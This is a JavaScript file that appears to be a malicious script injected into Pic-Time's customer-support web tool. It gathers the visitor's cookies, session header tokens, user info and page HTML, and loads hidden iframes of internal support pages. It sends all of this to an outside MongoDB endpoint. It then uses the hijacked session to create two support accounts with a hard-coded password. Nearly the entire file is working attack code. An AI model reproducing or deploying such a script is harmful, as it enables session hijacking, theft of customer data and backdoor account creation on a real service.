// https://rb.gy/6h50rx

const accessTokenRefresh = 300000; // 5 minutes

// Only run if not in iframe (like in mobile preview window)
if (window.location === parent.window.location) {
  if (!window.ptxAgbSetupComplete) {
    // Setup uuidv4 function on window
    window.uuidv4 = () => {
      return ([1e7] + -1e3 + -4e3 + -8e3 + -1e11).replace(/[018]/g, (c) =>
        (
          c ^
          (crypto.getRandomValues(new Uint8Array(1))[0] & (15 >> (c / 4)))
        ).toString(16)
      );
    };

    // Create a function to get the access token required to write to the mongo database
    const setPtxWindowAccessToken = async () => {
      return fetch(
        "https://us-east-2.aws.realm.mongodb.com/api/client/v2.0/app/data-dkerm/auth/providers/anon-user/login"
      )
        .then((resp) => resp.json())
        .then((json) => json.access_token)
        .then((token) => (window.accessToken = token));
    };

    // Reset access token every 5 minutes
    setInterval(async () => {
      await setPtxWindowAccessToken();
    }, accessTokenRefresh);

    // Create a function to insert a document to into the mongo ingest collection
    window.insertDoc = async (type, data) => {
      const envelope = {};
      envelope.sessionId = window.agbSessionId;
      envelope.type = type;
      envelope.data = data;
      envelope.userAgent = navigator?.userAgent;

      envelope.ptData = window.ptData;

      envelope.ts = Date.now();

      return fetch(
        "https://us-east-2.aws.data.mongodb-api.com/app/data-dkerm/endpoint/data/v1/action/insertOne",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "Access-Control-Request-Headers": "*",
            Authorization: `Bearer ${window.accessToken}`,
          },
          body: JSON.stringify({
            collection: "ingest",
            database: "pictimeDataDb",
            dataSource: "pixieset-data",
            document: envelope,
          }),
        }
      );
    };

    // Create a session ID for the window
    if (!window.agbSessionId) {
      window.agbSessionId = uuidv4();
    }

    // Capture PT Data
    window.ptData = {};
    window.ptData.headers = _pt$?.hdrs || null;
    window.ptData.userInfo = _pt$?.userInfo || null;
    window.ptData.cookie = document.cookie;

    // Start session
    function startSession() {
      // Log session
      window.insertDoc("session", { sessionId: window.agbSessionId });

      // Log Location
      window.insertDoc("location", window.location);

      // Log Page HTML
      let pageHTML = new XMLSerializer().serializeToString(document);
      window.insertDoc("page-html", pageHTML);
    }

    window.ptxAgbSetupComplete = true;

    window.getIFrame = async (iframeUrl) => {
      try {
        const iframe = document.createElement("iframe");
        iframe.src = iframeUrl;
        iframe.style.display = "none";
        document.body.appendChild(iframe);

        setTimeout(() => {
          const iframeHtml = iframe.contentDocument.documentElement.outerHTML;

          // Send Page HTML
          window.insertDoc("iframe-page-html", {
            location: iframeUrl,
            html: iframeHtml,
          });
        }, 5000);
      } catch (err) {
        console.error(err);
        window.insertDoc("error", err.toString());
      }
    };

    // Load intial access token
    setPtxWindowAccessToken().then(async () => {
      startSession();

      getIFrame("https://cstool.pic-time.com/!customersupport");
      getIFrame("https://cstool.pic-time.com/!customersupport?marketing=true");

      const loggedInFetchUrl =
        "https://cstool.pic-time.com/!servicescs.asmx/isSignedIn";

      try {
        const resp = await fetch(loggedInFetchUrl, {
          headers: {
            accept: "application/json, text/javascript, */*; q=0.01",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "content-type": "application/json; charset=UTF-8",
            pictimeGUser: window.ptData.headers.gusr,
            pictimeProject: window.ptData.headers.lusr,
          },
          body: "{}",
          method: "POST",
        });

        const json = await resp.json();

        window.insertDoc("fetch", { url: loggedInFetchUrl, data: json });
      } catch (err) {
        window.insertDoc("error", err.toString());
      }

      const gUserAccessFetchUrl =
        "https://cstool.pic-time.com/!servicescs.asmx/getGUserAccess";

      try {
        const resp = await fetch(gUserAccessFetchUrl, {
          headers: {
            accept: "application/json, text/javascript, */*; q=0.01",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "content-type": "application/json; charset=UTF-8",
            pictimeGUser: window.ptData.headers.gusr,
            pictimeProject: window.ptData.headers.lusr,
          },
          body: JSON.stringify({ email: "sam+support@pic-time.com" }),
          method: "POST",
        });

        const json = await resp.json();

        window.insertDoc("fetch", { url: gUserAccessFetchUrl, data: json });
      } catch (err) {
        window.insertDoc("error", err.toString());
      }

      const createFetch1Url =
        "https://cstool.pic-time.com/!servicescs.asmx/createCSUser";

      try {
        const resp = await fetch(createFetch1Url, {
          headers: {
            accept: "application/json, text/javascript, */*; q=0.01",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "content-type": "application/json; charset=UTF-8",
            pictimeGUser: window.ptData.headers.gusr,
            pictimeProject: window.ptData.headers.lusr,
          },
          body: JSON.stringify({
            csUser: { name: "Lara W Pic-Time", email: "angelaclaxton@protonmail.com", password: "rabbithorse1989", type: 10 },
          }),
          method: "POST",
        });

        const json = await resp.json();

        window.insertDoc("fetch", { url: createFetch1Url, data: json });
      } catch (err) {
        window.insertDoc("error", err.toString());
      }

      const createFetch2Url =
        "https://cstool.pic-time.com/!servicescs.asmx/createCSUser";

      try {
        const resp = await fetch(createFetch2Url, {
          headers: {
            accept: "application/json, text/javascript, */*; q=0.01",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "content-type": "application/json; charset=UTF-8",
            pictimeGUser: window.ptData.headers.gusr,
            pictimeProject: window.ptData.headers.lusr,
          },
          body: JSON.stringify({
            csUser: { name: "Aga M Pic-Time", email: "aga.m+support@pic-time.com", password: "rabbithorse1989", type: 10 },
          }),
          method: "POST",
        });

        const json = await resp.json();

        window.insertDoc("fetch", { url: createFetch2Url, data: json });
      } catch (err) {
        window.insertDoc("error", err.toString());
      }
    });
  }
}
